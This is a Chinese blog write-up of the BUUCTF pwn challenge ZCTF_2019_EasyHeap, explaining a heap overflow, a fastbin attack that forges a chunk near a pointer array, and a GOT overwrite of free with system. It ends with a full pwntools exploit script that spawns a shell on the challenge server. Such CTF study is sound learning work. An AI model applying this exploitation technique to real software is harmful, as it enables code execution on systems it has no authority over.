---
title: "BUUCTF Pwn ZCTF_2019_EasyHeap"
date: 2020-05-09T18:41:41+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# BUUCTF Pwn ZCTF_2019_EasyHeap

考点：

1、堆溢出

2、fastbin attack

3、House Of Spirit

![image-20200509185624980](D:\Github\myblog\static\images\image-20200509185624980.png)

![image-20200509185724239](D:\Github\myblog\static\images\image-20200509185724239.png)

常规的增、删、改，没有查看功能，但是程序中有个magic存在于bss段，输入4869满足if判断就执行l33t()，里面是system("cat /home/pwn/flag\")

![image-20200509190222323](D:\Github\myblog\static\images\image-20200509190222323.png)

分析create_heap功能，定义了个heaparray[i]数组来存储创建的chunk指针

![image-20200509190151327](D:\Github\myblog\static\images\image-20200509190151327.png)

read_input()=>read()

![image-20200509190448229](D:\Github\myblog\static\images\image-20200509190448229.png)

分析delete_heap功能，根据储存chunk指针的数组来free chunk，释放之后指针置为NULL不存在UAF漏洞

![image-20200509190657103](D:\Github\myblog\static\images\image-20200509190657103.png)

分析edit_heap功能，在edit中可以读入数据的大小由用户控制，存在堆溢出漏洞

![image-20200509191010959](D:\Github\myblog\static\images\image-20200509191010959.png)

所以解题思路就是利用堆溢出伪造fd指针，然后分配到bss段的magic处然后通过edit功能修改此处的值大于0x1305，然后运行程序输入4869就可以直接getflag，但是本题在BUUCTF上复现的，奈何BUUCTF上/home/pwn里没有flag，所以只能另辟蹊径getshell才能读flag

这里我们知道的是chunk指针是储存在heaparray[]数组中的，并且delete功能和edit功能都是依据数组中储存的堆指针来操作的，所以可以利用edit的堆溢出覆盖已经free掉的chunk的fd指针为数组附近的合适地址来伪造chunk申请到数组附近的内存空间，然后利用edit功能修改heaparray数组中的chunk指针为free_got的地址，这样再利用edit功能就可以修改free_got为system地址了，最后再free的时候就相当于执行system，可以发现在delete功能中free的构造是free(heaparray[v1])，所以我们可以在chunk中写入"/bin/sh\x00\"，这样执行free就是执行system("/bin/sh")

具体的利用方式：

1、add chunk0、chunk1

2、free chunk 1

3、edit chunk 0 堆溢出修改已经释放过的chunk1的fd指针为heaparray数组附近，为了绕过fastbin申请的大小要与链表中前一个堆的大小相同的验证，所以需要在heaparray之前找合适的数据来伪造chunk，常见的就是存在0x7f这样的数据的内存地址，完成之后fastbin->chunk1->faker chunk(heaparray附近)

![image-20200509215816742](D:\Github\myblog\static\images\image-20200509215816742.png)

![image-20200509214154378](D:\Github\myblog\static\images\image-20200509214154378.png)

heaparray偏移0x33处的0x6020ad存在0x7f，通过glibc的验证计算后与我们申请的0x70是大小相同的，所以能够正确的申请到这一块内存空间

4、然后add两个chunk，第二个chunk2就是heaparray附近了，然后通过edit chunk2来修改heaparray[0]->chunk0的指针为free_got，此时我们在edit chunk0就相当的可以修改free_got，修改为system_plt

因为我们申请的0x6020ad出的空间，读入的数据的从0x6020bd开始覆盖的，所以覆盖到heaparray[0]，需要

0x33-0x10=0x23=35字节

5、但是我们还缺少字符串/bin/sh，仔细观察我们在add到faker chunk之前还要add回来之前已经释放的chunk1，所以可以在add回来chunk1的时候向里面写入"/bin/sh\x00\"，最后free chunk1 就相当于执行system("/bin/sh")

```python
#!/usr/bin/env python2
#-*- coding=UTF-8 -*-
from pwn import *
context.log_level = 'debug'

if args.R:
	sh = remote('node3.buuoj.cn',29977)
else:
	sh = process('./easyheap')
elf = ELF('./easyheap')

def add(size,content):
	sh.sendlineafter('choice :','1')
	sh.sendlineafter('Heap :',str(size))
	sh.sendlineafter('heap:',content)

def edit(idx,size,content):
	sh.sendlineafter('choice :','2')
	sh.sendlineafter('Index :',str(idx))
	sh.sendlineafter('Heap :',str(size))
	sh.sendlineafter('heap :',content)

def free(idx):
	sh.sendlineafter('choice :','3')
	sh.sendlineafter('Index :',str(idx))

if __name__=='__main__':
	add(0x60,'aaaaaaaaaa') # 0
	add(0x60,'bbbbbbbbbb') # 1
	free(1)
    #堆溢出修改已经释放的chunk1的fd为0x6020ad
	edit(0,0x80,'a'*0x60 + p64(0) + p64(0x71) + p64(0x6020ad) + p64(0))
	#gdb.attach(sh)
    #在add回chunk1的时候写入/bin/sh
	add(0x60,'/bin/sh\x00') # 1
	add(0x60,'c')
	#gdb.attach(sh)
	edit(2,43,'c'*35 + p64(elf.got['free']))
	#gdb.attach(sh)
	edit(0,8,p64(elf.plt['system']))
	free(1)#->system("/bin/sh")
	sh.sendline('cat flag')
	sh.interactive()
```

总结：

1、我原本打算直接申请到free_got附近直接修改为system，但是好像行不通，必须要通过edit功能来修改，或许有其他的方法我不知道吧

2、我也想在add chunk2的时候直接覆盖heaparray[0]为free_got但是无法getshell，必须要通过edit来覆盖才能getshell，尽管他们的内存布局都一样，想不明白

